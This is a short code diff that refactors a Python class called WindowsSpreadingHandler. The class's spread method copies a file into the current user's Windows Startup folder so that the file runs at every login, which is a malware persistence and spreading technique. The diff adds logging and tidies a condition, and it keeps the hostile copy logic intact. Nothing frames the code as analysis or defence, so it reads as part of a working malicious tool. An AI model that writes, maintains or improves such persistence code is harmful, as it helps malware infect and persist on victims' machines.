@@ -1,5 +1,6 @@
 import os
 from shutil import copy
+from utils import logger
 
 
 class WindowsSpreadingHandler:
@@ -10,9 +11,9 @@ class WindowsSpreadingHandler:
     def spread(self,file)-> bool:
         try:
             cwd=os.getcwd()
-            if os.path.exists(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Roaming\\Microsoft\\Windows\\Start menu\\Programs\\Startup\\%s'%file)==False:
+            if not os.path.exists(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Roaming\\Microsoft\\Windows\\Start menu\\Programs\\Startup\\%s'%file):
                 copy(file,os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Roaming\\Microsoft\\Windows\\Start menu\\Programs\\Startup\\')                
             return True
         except Exception as e:
-            print(e)
+            logger.exception(e)
             return False
